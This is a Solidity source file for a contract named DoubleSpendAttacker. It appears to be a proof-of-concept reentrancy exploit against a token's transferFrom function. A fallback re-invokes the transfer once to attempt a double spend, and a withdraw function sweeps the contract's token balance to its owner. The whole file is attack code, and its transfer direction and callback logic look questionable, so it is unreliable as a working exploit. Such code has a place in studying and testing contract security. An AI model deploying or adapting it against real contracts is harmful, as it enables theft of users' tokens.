// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.24;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITransferFacet {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract DoubleSpendAttacker {
    ITransferFacet public immutable token;
    address public owner;
    address public victim;
    address public attacker_owner;
    uint256 public amountToSpend;
    bool private reentered;

    constructor(address tokenAddress) {
        token = ITransferFacet(tokenAddress);
        owner = msg.sender;
    }

    function setAttackParameters(address _attacker_owner, address _victim, uint256 _amount) public {
        require(msg.sender == owner, "Only owner can set attack parameters");
        attacker_owner = _attacker_owner;
        victim = _victim;
        amountToSpend = _amount;
    }

    function attemptDoubleSpend() public {
        reentered = false;
        token.transferFrom(attacker_owner, victim, amountToSpend);
    }

    fallback() external payable {
        if (!reentered) {
            reentered = true;
            token.transferFrom(attacker_owner, victim, amountToSpend);
        }
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        IERC20(address(token)).transfer(owner, IERC20(address(token)).balanceOf(address(this)));
    }
}